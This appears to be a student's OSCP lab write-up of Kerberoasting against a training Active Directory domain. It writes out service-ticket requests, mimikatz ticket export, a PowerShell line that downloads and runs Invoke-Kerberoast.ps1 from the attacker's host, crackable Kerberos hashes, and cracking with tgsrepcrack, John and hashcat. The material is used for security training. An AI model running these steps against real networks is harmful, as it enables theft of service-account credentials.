21.3.4.1

# 21.3.4.1.1. Repeat the manual effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script.

Request a service ticket. As user corp\offsec on the Windows 10 client, run the following in powershell:
`Add-Type -AssemblyName System.IdentityModel`
`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'`
![7be55cf043eabdc00aa47474200aebf9.png](95b766469ad54c6497e3d3af5703723e.png)

The requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. Display all cached Kerberos tickets for the current user. As an alternative to mimikatz, we will use klist. Notice we now have a ticket for HTTP/CorpWebServer.corp.com
`klist`
![411372bd0eb9713b8092b4d45f06cf85.png](4fa6216a6b92428088c2ae9cbe564e14.png)

Download the service ticket with mimikatz
`kerberos::list /export`
![050bd35693ec79460e0575fc235001a1.png](020cd4fc95394f9093a871256bee4ce4.png)

On Kali, install kerberoast
![853f77ec271c1131a1366c697dce0ab0.png](3d76f01b9c544a789072fa5af8fdf0d3.png)

Transfer the tickets to the Kali machine via netcat
![62888003a0bad357461b17efcb0a08ff.png](0123e5fcda0345a58f5d7bef9bd22118.png)

Run tgsrepcrack.py with rockyou.txt. We have a UTF error.
`python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt ~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi`
![d80d7fa311b4e5c4709cd5520d824ab7.png](45c1669431424befb6b9ae6f6c460ae9.png)

Run iconv to fix utf8 errors in rockyou.txt
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt
```

Run tgsrepcrack.py with rockyou_utf8.txt. Prior to running tgsrepcrack.py, we already know the password is `Qwerty09!`. We only did this to show how to resolve the utf errors.
`python3 tgsrepcrack.py ~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks/rockyou_utf8.txt ~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi`
![9706f54d25dc162bb80f7a35c0e03ae3.png](feb613f83bba42108bb802b499140198.png)


# 21.3.4.1.2. Perform the same action with any other SPNs in the domain.
### SPN: MSSQLSvc/CorpSqlServer.corp.com:1433
Request a service ticket
`Add-Type -AssemblyName System.IdentityModel`
`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/CorpSqlServer.corp.com:1433"`
![b0aaaa6e2514e575cdd0d43b8ac801bd.png](100596af901f4128aee84173ca73f1c1.png)

Display all cached Kerberos tickets. We see ticket #1 is the one for MSSQLSvc/CorpSqlServer.corp.com:1433
`klist`
![628ffe1db87258b294a7de5244419bb4.png](484387218590403e978764ebe96dfb0b.png)

Download the service ticket with mimikatz. We see it's downloaded as 1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi
`kerberos::list /export`
![ec252d4e7e31ec241f3dcc7fcf85c3b3.png](e4909fdaafd845d6a98e393819ded7e0.png)

Transfer the ticket to Kali
![aca5a26b5916aea2aa94a42b08a0d4fe.png](b815674e0f664c508dc0e4cc972f154f.png)

Run tgsrepcrack.py. It has cracked the password. **Note: rockyou.txt does NOT contain the already known password Qwerty09! as indicated in training manual. Instead I made a short wordlist named passwords.txt that contains the password, to show that the command works**
`python3 /usr/share/kerberoast/tgsrepcrack.py passwords.txt 1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi`
![d9a19b14aa80b293fb473e4f1bbc9ebb.png](788b5aceb34a467aa1dc96c9cdae072a.png)
![bc5552ed31933770e56a332cbd935f7f.png](7903367c79fe40019503994b2a235255.png)


### SPN: kadmin/changepw
`Add-Type -AssemblyName System.IdentityModel`
`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "kadmin/changepw"`
![66f60dca0de2bd2d2faddd2f9ef7d60d.png](441a1ebfadb44a95a80591dcb15e8a54.png)

Display all the cached Kerberos tickets. We see kadmin/changepw is ticket #1
`klist`
![3cd73a91cc449bc773ad491873a6f2fe.png](270768b3c07549c6b4b36b06068a31f0.png)

Download the service ticket with mimikatz. We see it's downloaded as 1-40a10000-offsec@kadmin~changepw-CORP.COM.kirbi
![96967e4959bb8c5877670c4e353c59bc.png](625b26c0d1954693b69b5a33fbb4a7dc.png)

Transfer the ticket to Kali
![62e4036deaf2030c04c365d2cace3176.png](480559bae69b4fb4827b1c0906b0c4ec.png)

Run tgsrepcrack.py. We were unable to crack the password.
`python3 /usr/share/kerberoast/tgsrepcrack.py passwords.txt 1-40a10000-offsec@kadmin~changepw-CORP.COM.kirbi`
![dcc20268565a6b530bc1a98c476a4a58.png](02401db390104d4a82e709bdeecd0942.png)



# 21.3.4.1.3. Crack the same service ticket using John the Ripper.
Convert the kirbi file to a file john can use. **Note: I used the code from git clone https://github.com/nidem/kerberoast.git**
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ python3 ~/gitWorkspace/tools/kerberoast/kirbi2john.py *.kirbi > hashes.txt
tickets written: 5 
```

Here is what the hash looks like
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat hashes.txt                                             
$krb5tgs$23$*0-40e10000-offsec@krbtgt~CORP.COM-CORP.COM*$f6104375d63b494fbd729b14e0290787$2088347bdf62f04ed57e196298b05dc8d220a4baaca04b15fe869b86a0c2b5ce57fec68dd36030abeae3a3d38b98fdb9b1f303a2f14d2cdc0fcbca326a2dd807418c560a2602112f17b907d3a208ca010ab43af051c8854bc8b4ad114690be64bf9ada11917706db21fba50bcb484a493a9e099e10445d2f18ec1a950c50d85cdeb1130c387db200a3e6d0137afcba0d10fd5e5e21f22e6d8fc774aa3d532046b2f2009af4b73999a8b8962aa4a971a81b4b2ede96e1ee758eb83cb5cad4ddca3ff6fa969d57b9e7163a664c068e40eaebd83e2236a4cf7dda28de356f40becdbfd70a5bb3f5dfb8f5c460924f2596213d3558ea3fd8e9f143ad87992a5ada919bfbc8f25c5a151b439df5d2bca61867274673c6b07d28dd9e90d349d64152d10022c854072495e8a5a9768fd8314ad2cc7b48e70935259ef3b8bed84ce4bee325ff8254b2f033ecf1df011a81b57613741387058ad0aae0dc989b04481ac112b5021cd3bbf5db1a7f1ebe35c80bcb5b73c73398732577d88e0da2ec91a463bfc2b2d8cd1b3943c02838c81183cee24ed213451fab57b1d40a1b0d6b17092d902b51803bf7cf984cc54275895d471bbe057c9e927ec7bcd40d776d840845c906206a6b2584c0c81af061e85c2319d8e9595a7ddf260b230c4813a75bfdf88a61290c898e643b8e0052b4ab581e50f0786b9fe1da4156c1faa8d407dd6452e2f2445204b66f6b971e71743838589db54277b0221688ec9c11b60842e72ac94066f02e1e0847cd82569d6e7d5e0a821a6ee0290fffb57afaeb88e04ffd81cc76f2a697ee3d206d100d0a3e8b1e78a310fadb266a2faf6c37da52dc03c24f496c92166895c628d230856da48cddf0a63994efcddb11bc9406d7bc77ffa3ae62622c378e135460444e3af74740f25108f90a291a1f03dc5d238e623340ac8dcac29798079c2fd0a3ff56b1a139f2d7efbfac079359e8a277e1974030ce1d33e63eaf464d9585eb35696294d0a726c4032283d545fd2d679cbae46674879a89ec9298347f251f8dc537793ca403e2bfcb2f1f4ac4feb3bfeb136b79d725998b96791894d8a9ae314d9cceb705ea6381032657642095eeb82d6f6ef07251cb5ee35e27d27fd43f4da6487ae05664401df074b6891704febec8aa87c0565b43d6c76a26ddac43b4af0744a119a4f5e7166cea459bec5e6d22ecf0ce74bd016751de504baf81fdaf08d6f5c121aea92043fa732bac2f8ab78a1768917476b449de2116e9ac8943                                                          
$krb5tgs$23$*1-40a10000-offsec@kadmin~changepw-CORP.COM*$b412e5149a5ce7b684b08f71b9bfc7ea$ba823dd99c06c99b30f1bfa227887feac742675f9b5532ee50c62794740cf530b7907df5abbf1bfb85a43cd6eafa5eed2993...
$krb5tgs$23$*1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM*$b40696a1e8f7213f9b77bdfce13c6879$3aed108ec7a64640b4bf5afd7773d57a6548bcd8a3ef015068f24894c18a537fa609c8d480c9299...
$krb5tgs$23$*1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM*$6bb9645c4bf9534a81acf640b5c61d0e$9cdb089a8958b70497b7e579273f25001da61e08ecc399591f050b583f9a33deb839a509bc4739f40e38dae8...
$krb5tgs$23$*2-40a50000-offsec@LDAP~DC01.corp.com~corp.com-CORP.COM*$a0376f4dd82ff29fb7a05f87b90e43ca$dc5fbc1ddb80fcdea224cb821ced821be9fc990a1b87255e14029684acc1238e2c005c4b5ca5368db17ee7a2a15a7c4b4a7d1732f8a1ea0abc1bebccc37dae36b81c2612347687cd10966f9137c6a41b20880173d8b8eace3da8738...
```

Run john on the hash file
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ sudo john hashes.txt --wordlist=passwords.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Remaining 3 password hashes with 3 different salts
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2020-10-08 04:54) 0g/s 1100p/s 3300c/s 3300C/s asdf..reddljg
Session completed
```

Properly output the cracked password. However, it doesn't say which ones were cracked...
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ sudo john --show hashes.txt 
?:Qwerty09!
?:Qwerty09!

2 password hashes cracked, 3 left
```


# 21.3.4.1.4. Use the Invoke-Kerberoast.ps1 script to repeat these exercises.

Download Invoke-Kerberoast.ps1 to the Apache Web Server and restart Apache2.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ sudo cp /usr/share/powershell-empire/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ sudo systemctl start apache2
```

Download Invoke-Kerberoast.ps1 to the Windows Client
```plaintext
PS C:\Users\offsec\Desktop> iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.214/Invoke-Kerberoast.ps1')  
```
Run Invoke-Kerberoast.ps1 to have an output format for Hashcat.
```plaintext
PS C:\Users\offsec\Desktop> Invoke-Kerberoast -OutputFormat Hashcat    
TicketByteHexStream  :                                                 
Hash                 : $krb5tgs$23$*iis_service$corp.com$HTTP/CorpWebServer.corp.com*$E4BC4C2BB8CD2E3642AE0A3E97C5F829$DF6D721D2887C491E09A1DD882291D6F88ED208804D3EA6AC91F480AB3750CC4737C0CA64010B6FB547F6C6F1C43D43BB86853C9868B808BEC905757D8EB782D76E8348CA315545A9EF37EAF39D55CC8B97A10BB4F1D52F491F5D6C1049F5D29D4BDC7A375F2DE7F72A8F34B91627D48EE5B2539A40C0DF8472D9ABAB472BB16A1F57767E8BBD0765499E1C672CBE4FFBD405904A94D86B7C1E4A1651D1C07E4780A72475A6033AC4AF183EF9737818FF35B11DF5BA1D96F5E6F3E62CC60CD404F5D326CC31C0D275849648B6FDFFEDAFD9ED5F41A8E0E353DEC74DE6573FC021D2CA0D233A68DAD403BE8CB93B85FD9ABB29E98760EDAC0BC2BFDA08AA88BE5B36E49334CD9C13E27C3C21FC34E61375A349FD0C7CFB3602BCCF2C9E3BB0461BA030B5EBEC720ED7AFDA80F8AAA0A1A0434C6181D4663A8DB29B06B864C508CB8635457ED80C3EA92BDDD743297039D7BA784272B19C9708A4D2AC6BC9AA0F1C3AB0FB52520E2AB5A43EE40E2C17AFA381201F62DA6D3540FD0A69967EF01893387E2052D4722B34BC74AE0C68E46F3A04928A0BBA2DECF46DF03DFA6B5EAD67E02A245B4C2FA72C39CCC9E9D08F70A2A7CA21DB55034899D37E20A94ADEB32F82705CBF2EB9D260079061A42CAA0D85044E05D16ED65CCC91E0770004FDB81F93FC78F5094C3A8EC410A134BE5545946C038FE5E91D16DF2408047A241ED53339E9BAD503273FDA0688CA560C9B96BD89AF5D6B23190B9C247FAAF8BCF57974097FB7C764A71FCDF3B6C4452FB4186FB64FE09164823A79937A09A9DC540298D6C32F88E050A6E0707B665EFD17F173A3EE1467E152737D9E0BD98235654952C9A2B796A65168939E35EC4591282BBC89498BC8E27340F623384AF947E7A979A011FE9A2DB5E1D685A8224F3DD03E162B8731C07727607CA305AD93AB05A9DCCAA2C8F150B1B053AC91C8AEC6DE09AE552347327F116A0E39CAE2C044E741F6FE79DB4A1AC61B30C177975B825EA80C1332D675257C584446B5B257E67F0BCB1CDDA7E5E959FFCFF8C610914F58A08C6C8C4040FAB47837879E6297447CE6D0F0B00744ADB0082E0AFEDE848A47839D90C4140301BD4AE4C632DBC6EE9F696D71B06889E6C8D40B9647DABC471722ACCE76C29CFE24F9D44B25B8578762D33D680FB353AD7DB5D5FA8A6D8BEF293D8DA6FB73382D623EBE583A20E17B0A8A5378583095BBD0251E90AFD025014CEBFD443975791AACA900CDA00CA7E303474BC2E4CD0425448C9D5E4B30E95906204E266BD17FB4175CED0F4B441C0D8963FA6DC6F44FAD07E7B24ACC94F19FBCD73CE51DA805C83D337E827198D050940F6DB1BBA42EC7BA283796A4AC811D584266A33789488344B1EDF0C89120BA185C94D                                                
SamAccountName       : iis_service                                     
DistinguishedName    : CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com          
ServicePrincipalName : HTTP/CorpWebServer.corp.com                     
TicketByteHexStream  :                                                 
Hash                 : $krb5tgs$23$*sql_service$corp.com$MSSQLSvc/CorpSqlServer.corp.com:1433*$BD7066553A5B35A46EA90A2721F57AFD$D10585C601A3F51E5773460B0B55AE5775B22B5CEFB53164AA57E615271BCF92648F725CAF5AB0FDEB7CE8B2C33EA219700526290AE680AAA113E84B62F1B3E83409103EB8B10C5392E4A1EE79F0E50539E27710655C8B48DB33101AA9DFE9901741D5C9A1A2472B7DAB414445633609E897B53EC92EFC98F7F274A5D6608C5D7DC8552CE87E5A9F39E09AA675A65722AB5C5B265B979C58F5686AB84EC798F7C334853407F4AA53BE0CFF2980C89C2F658738A3CF062CAEA9FF56E7DEE048C386D7236C9628944B9228D569D15FA8CAC37A7AE02104BAAB22563ED1FFDB85C600304A09B35D30331D04472760E2E3E60DA0976B                                              
SamAccountName       : sql_service                                     
DistinguishedName    : CN=sql_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com          
ServicePrincipalName : MSSQLSvc/CorpSqlServer.corp.com:1433
```
![88b54c1f8503c1e58d6a83cccb931224.png](bbfa509073354d8f8e8a9d0fb9018340.png)

Copy the hash into spns.txt on your Kali machine, then run hashcat on it
`sudo hashcat -a 0 -m 13100 spns.txt passwords.txt --force`
![86729b6262d0ef71ecd416269dc0caaf.png](ffd9590ab2ac4c66acd6c5f510fd0473.png)
![b829d6ea0ffa70f719072355e29311d7.png](27aba470c8794947b57c4c775b5f0e39.png)

Verify that the password was cracked by viewing the potfile.
`hashcat --show /home/kali/.hashcat/hashcat.potfile`
![e8050417f86a1879e9faa5b27085cde0.png](d498b75239d6418c8f4109b8daf84404.png)